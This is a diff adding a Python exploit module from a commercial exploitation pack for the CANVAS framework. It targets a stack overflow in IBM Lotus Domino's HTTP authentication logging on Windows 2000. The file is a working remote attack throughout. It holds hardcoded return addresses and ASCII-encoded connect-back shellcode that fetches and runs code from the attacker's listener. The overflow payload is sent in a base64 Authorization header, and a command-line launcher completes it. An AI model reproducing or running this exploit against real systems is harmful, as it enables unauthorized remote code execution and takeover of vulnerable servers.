@@ -1,0 +1,149 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import base64
+
+if "." not in sys.path:
+    sys.path.append(".")
+    sys.path.append('../../encoder')
+    sys.path.append('./encoder')
+    
+import printable
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+# GUI info
+NAME = "IBM Lotus Domino HTTP Authentication Logging Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in IBM Lotus Domino HTTP Authentication Logging"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2002.04.16"
+DOCUMENTATION["Versions Affected"] = "IBM Lotus Domino Web Server < 5.0.10"
+DOCUMENTATION["CVE Name"] = "CAN-2002-1624"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-1624"
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000" ]
+
+NOTES = """
+Prepend ASCII code is dependant from code representation of ret address
+"""
+
+CHANGELOG = """
+"""
+  			
+targets = {    
+    0: ['Windows 2000 SP4 French', 0x78494d42],  # pop pop ret @ NTDLL.DLL => 0x78494d42 / call ebx @ NTDLL.DLL => 0x78485440
+    1: ['Windows 2000 SP4 English', 0x774e2d56],  # pop pop ret @ RASAPI32.DLL => 0x774e2d56 / call ebx @ KERNEL32.DLL => 0x7c582655
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.ssl = 0
+        self.port = "80"
+        self.host = ""   
+        self.name = NAME                
+        return
+
+    def neededListenerTypes(self):
+        return [canvasengine.WIN32MOSDEF]
+    
+    def createShellcode(self):
+        from shellcode import shellcodeGenerator
+        sc=shellcodeGenerator.win32()
+        sc.addAttr ('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
+        sc.addAttr('SmallRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
+        sc.addAttr('UseWS2Ordinal',None)
+        rawshellcode=sc.get()
+        raw=sc.get()
+        # ASCII encoder
+        encoder=printable.intelprintableencoder()        
+        self.shellcode=encoder.encode (raw)
+        return self.shellcode
+            
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+        
+        s = self.gettcpsock()
+        
+        try:                
+            s.connect((self.host, self.port))
+            self.websend(s, sploitstring)                   
+        except:       
+            self.log("Could not connect to port %s with ssl=%s" % (self.port, self.ssl))                 
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0        
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+           
+        return 1
+        
+    def makesploit(self):
+        """
+        Construct the attack
+        """
+        	       	
+	os_name, ret = targets[self.version]
+	
+	buff = "A"*0x200
+	
+	sc = self.shellcode
+	tmp = "AA" + "\x51\x5c" + sc[0:len(sc) - 20]
+	eip = struct.pack('<L', ret) 
+
+        # Windows 2000 US	
+	if (self.version == 1):
+		prepend = "AAAAAAAAAAAAAAAA"
+		prepend += "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x59\x56\x54\x58\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48\x32\x41\x4e\x30\x41\x4e\x51\x58\x2D\x60\x49\x49\x49\x2D\x7e\x64\x62\x62\x2D\x7e\x54\x54\x54\x50\x59\x48\x48\x50\x40"
+	# Windows 2000 FR
+	else:
+		prepend = "AAAAAAAAAAAAAAAAAAAAAAAA"
+		prepend += "\x4c\x4c\x4c\x4c\x59\x56\x54\x58\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48\x32\x41\x4e\x30\x41\x4e\x51\x58\x2D\x60\x49\x49\x49\x2D\x7e\x64\x62\x62\x2D\x7e\x54\x54\x54\x50\x59\x48\x48\x50\x40"
+		
+	res = base64.b64encode(tmp + "AAAA" + eip + prepend + buff + ":" + "AAAAA")	
+
+	sploitstring = "GET /names.nsf HTTP/1.0\r\n" + "Authorization: Basic " + res + "\r\n\r\n"
+								                    
+        return sploitstring
+
+    def displayVersions(self):
+        i = 0
+        print 'Available versions:'
+        for listline in targets.values():
+            print "\t%d: %s" % (i,listline[0])
+            i += 1
+
+    def usage(self):
+        print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+        self.displayVersions()
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
+
